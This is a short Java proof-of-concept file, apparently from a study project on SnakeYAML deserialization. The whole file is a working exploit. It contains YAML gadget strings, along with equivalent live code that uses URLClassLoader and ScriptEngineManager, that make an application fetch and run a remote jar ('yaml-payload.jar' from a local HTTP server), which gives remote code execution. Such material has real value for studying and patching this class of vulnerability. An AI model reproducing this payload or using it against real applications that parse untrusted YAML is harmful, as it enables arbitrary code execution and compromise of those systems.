package com.ttestoo.snakeyaml.payload;

import org.yaml.snakeyaml.Yaml;

import javax.script.ScriptEngineManager;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @Author 领悟。
 * @Date 2021/8/10 11:39 下午
 */
public class TestPayload {
    public static void main(String[] args) throws MalformedURLException {
//        Yaml yaml = new Yaml();
//        Object url = yaml.load("!!java.net.URL [\"http://127.0.0.1:8088/yaml-payload.jar\"]");
//        // class java.net.URL
//        System.out.println(url.getClass());
//        System.out.println(url);

        //直接通过load()读取
//        Yaml yaml = new Yaml();
//        Object url = yaml.load("!!javax.script.ScriptEngineManager [\n" +
//                "  !!java.net.URLClassLoader [[\n" +
//                "    !!java.net.URL [\"http://127.0.0.1:8087/yaml-payload.jar\"]\n" +
//                "  ]]\n" +
//                "]");

        //等价于
        URL url = new URL("http://127.0.0.1:8087/yaml-payload.jar");
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
        new ScriptEngineManager(urlClassLoader);

    }
}
